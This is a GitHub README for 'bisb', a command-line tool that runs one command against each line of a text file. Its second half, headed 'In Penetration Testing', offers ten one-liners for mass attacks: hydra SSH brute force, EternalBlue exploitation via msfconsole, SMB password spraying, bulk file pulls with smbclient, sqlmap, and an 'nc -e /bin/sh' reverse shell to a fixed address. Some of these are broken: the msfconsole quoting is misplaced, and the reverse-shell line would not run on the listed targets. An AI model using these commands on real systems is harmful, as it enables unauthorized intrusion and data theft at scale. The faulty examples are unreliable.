# Batch-is-Better

![bisb Logo](https://github.com/GTekSD/Batch-is-Better/assets/55411358/efbe645c-8392-46b0-a52e-108c87e30f82)

**bisb (Batch is Better)** is a command-line tool designed to simplify batch processing tasks by executing commands listed in files. It enhances script management and execution, making batch operations more straightforward and efficient.

## Features

- **Execute Commands from Files**: Allows users to execute commands listed in text files.
- **Interactive Banner**: Colorful and informative banner for a visually appealing interface.
- **Customizable Examples**: Includes 15 unique examples demonstrating various use cases.
- **Usage Guidance**: Detailed usage instructions and examples provided with `-h` or `--help`.

## Installation

To install **bisb**, follow these steps:

1. **Download** the latest release from the [Releases page](https://github.com/GTekSD/Batch-is-Better/releases).
2. **Copy** the downloaded `bisb` script to `/usr/bin` to make it executable system-wide:
   ```bash
   sudo cp bisb /usr/bin/bisb
   sudo chmod +x /usr/bin/bisb
   ```

## Usage

To use **bisb**, follow these steps:

- Run `bisb` with your desired command and a filename containing the list of items to process:
  ```bash
  bisb "<command>" <filename.txt>
  ```

- For more information and examples, use the `-h` or `--help` flag:
  ```bash
  bisb -h
  ```

## Examples

Here are some examples of how to use **bisb**:

1. System Administration:
   ```bash
   bisb "sudo systemctl restart service" server_list.txt
   ```

2. Data Processing:
   ```bash
   bisb "python process_data.py" data_files.txt
   ```

3. Configuration Management:
   ```bash
   bisb "ansible-playbook deploy.yml" environments.txt
   ```

## Contributing

Contributions to **bisb** are welcome! Please feel free to [open an issue](https://github.com/GTekSD/Batch-is-Better/issues) or [submit a pull request](https://github.com/GTekSD/Batch-is-Better/pulls) for enhancements or bug fixes.


## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

Developed with ❤️ by [Сухас Дхолз](https://gteksd.github.io/) for [GTekSD](https://github.com/GTekSD/).

-----------------

# In Penetration Testing

To demonstrate how **bisb (Batch is Better)** can be highly useful in a pentesting scenario, here are 10 critical examples that simplify complex tasks:

### 1. **Automated Vulnerability Scanning**
```
$ bisb "nmap -sV --script vuln" target_list_with_ports.txt
```
- This command runs a vulnerability scanning on specific ports on multiple targets, this is the quickest way to complete a full scan.
- List.txt should be in this format:
  192.168.1.100 -p 8080
  192.168.1.200 -p 1433

### 2. **Brute Force Attack**
```
$ bisb "hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100" servers.txt
```
- Automates brute force attacks on multiple SSH servers, saving time and effort.

### 3. **Automated Exploit Execution**
```
$ bisb "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS' $line; run" targets.txt
```
- Automatically runs the EternalBlue exploit on a list of vulnerable targets.

### 4. **Mass Password Spraying**
```
$ bisb "crackmapexec smb $line -u users.txt -p password123" targets.txt
```
- Executes password spraying across multiple SMB servers, helping identify weak passwords.

### 5. **File Enumeration and Extraction**
```
$ bisb "smbclient //$line/shared -c 'prompt OFF; recurse ON; mget *'" smb_servers.txt
```
- Recursively downloads files from shared folders on multiple SMB servers.

### 6. **Batch Web Application Testing**
```
$ bisb "nikto -h $line" web_targets.txt
```
- Runs Nikto web server vulnerability scans on a list of web applications.

### 7. **Automated Directory Bruteforcing**
```
$ bisb "dirb http://$line /usr/share/wordlists/dirb/common.txt" web_targets.txt
```
- Uses Dirb to brute force directories on multiple web applications, revealing hidden paths.

### 8. **SQL Injection Testing**
```
$ bisb "sqlmap -u http://$line --batch" sql_targets.txt
```
- Automates SQL injection testing across various web applications.

### 9. **Network Reconnaissance**
```
$ bisb "netdiscover -i eth0 -r $line/24" subnets.txt
```
- Discovers live hosts within multiple subnets, crucial for network mapping.

### 10. **Automated Reverse Shell Deployment**
```
$ bisb "nc -e /bin/sh 192.168.1.200 4444" target_list.txt
```
- Establishes reverse shells on multiple targets for remote control.

### Summary
These examples show how **bisb (Batch is Better)** can automate repetitive and critical tasks during a pentest, making the process more efficient and less error-prone. It saves time, increases productivity, and ensures comprehensive coverage across multiple targets.
